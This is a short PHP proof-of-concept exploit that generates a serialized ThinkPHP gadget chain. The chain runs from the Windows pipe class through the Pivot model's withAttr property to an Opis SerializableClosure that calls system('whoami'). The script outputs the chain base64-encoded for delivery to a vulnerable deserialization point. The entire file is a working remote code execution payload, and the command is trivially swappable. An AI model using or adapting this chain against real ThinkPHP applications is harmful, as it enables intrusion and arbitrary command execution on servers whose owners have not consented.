<?php
namespace think;
require __DIR__ . '/vendor/autoload.php';
use Opis\Closure\SerializableClosure;
abstract class Model{
    protected $append = [];
    private $data = [];
    protected $visible = [];
    private $withAttr = [];
    function __construct(){
        $this->data = ["huha"=>''];
    	# withAttr中的键值要与data中的键值相等
    	$this->withAttr = ['huha'=> new SerializableClosure(function(){system('whoami');}) ];
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model
{
}

namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
//var_dump(new Windows());
echo base64_encode(serialize(new Windows()));
?>